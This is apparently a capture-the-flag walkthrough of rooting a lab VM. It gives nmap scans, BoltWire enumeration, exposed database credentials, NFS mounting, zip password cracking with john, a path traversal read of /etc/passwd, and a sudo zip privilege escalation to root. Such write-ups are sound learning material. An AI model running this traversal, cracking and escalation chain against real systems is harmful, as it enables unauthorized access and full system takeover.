### nmap -vv -sS -Pn -oN 10.0.2.155_ports.nmap -p- 10.0.2.155

PORT STATE SERVICE REASON  
22/tcp open ssh syn-ack ttl 64  
80/tcp open http syn-ack ttl 64  
111/tcp open rpcbind syn-ack ttl 64  
2049/tcp open nfs syn-ack ttl 64  
8080/tcp open http-proxy syn-ack ttl 64  
43969/tcp open unknown syn-ack ttl 64  
46941/tcp open unknown syn-ack ttl 64  
54575/tcp open unknown syn-ack ttl 64  
55321/tcp open unknown syn-ack ttl 64  
MAC Address: 08:00:27:6E:28:BF (Oracle VirtualBox virtual NIC)
 
### nmap -vv -sC -sV --script=vuln -oN 10.0.2.155_svcs.nmap -p 22,80,111,2049,8080 10.0.2.155

22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))  
CVE-2019-9517 7.8 [https://vulners.com/cve/CVE-2019-9517](https://vulners.com/cve/CVE-2019-9517)  
MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-  
| /.gitignore: Revision control ignore file  
| /app/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'  
| /src/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'  
|_ /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'  
111/tcp open rpcbind syn-ack ttl 64 2-4 (RPC #100000)  
2049/tcp open nfs syn-ack ttl 64 3-4 (RPC #100003)  
8080/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))  
/dev/: Potentially interesting folder
 
### Dirbuster
 
## Manual Web enum:

### Port 80

Bolt - Installation error
 
### Port 8080

PHP Version 7.3.27-1~deb10u1  
Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64  
/etc/apache2  
mysqlnd 5.0.12-dev - 20150407 - $Id: 7cc7cc96e675f6d72e5cf0f267f48e167c2abb23 $  
SQLite Library 3.27.2  
Version 6.03 of BoltWire.
 
[http://10.0.2.155:8080/dev/index.php](http://10.0.2.155:8080/dev/index.php)  
Register new user  
Navigate to [http://10.0.2.155:8080/dev/index.php?p=member.admin&action=data](http://10.0.2.155:8080/dev/index.php?p=member.admin&action=data)  
==Admin password: I_love_java==
 
[http://10.0.2.155/app/cache/config-cache.json](http://10.0.2.155/app/cache/config-cache.json)  
[http://10.0.2.155/app/config/config.yml](http://10.0.2.155/app/config/config.yml)  
database:  
==driver: sqlite==  
==databasename: bolt==  
==username: bolt==  
==password: I_love_java==  
path "/var/www/html/app/database/bolt.db"
 
## Manual NFS enum

### showmount -e 10.0.2.155

Export list for 10.0.2.155:  
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16  
mkdir /tmp/mount  
sudo mount -t nfs 10.0.2.155:/srv/nfs /tmp/mount/ -nolock
 
### zip2john save.zip -o todo.txt > todo.hash

### zip2john save.zip -o id_rsa > id_rsa.hash
 
### john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

==java101== (save.zip/id_rsa)  

### john --wordlist=/usr/share/wordlists/rockyou.txt todo.hash

==java101== (save.zip/todo.txt)
    
## Exploitation

Google search Boltwire exploit  
Navigate to:  
[http://10.0.2.155:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd](http://10.0.2.155:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd)  
Found /etc/passwd  
Found user jeanpaul (jp)  
Test:

### ssh -I id_rsa jeanpaul@10.0.2.155

Password: I_love_java
 
Shell
 
Sudo -l  
/usr/bin/zip  
GTFObins for zip
 
### TF=$(mktemp -u)

### sudo zip $TF /etc/hosts -T -TT 'sh #'
 
Root

### cat /root/flag.txt

Congratz on rooting this box !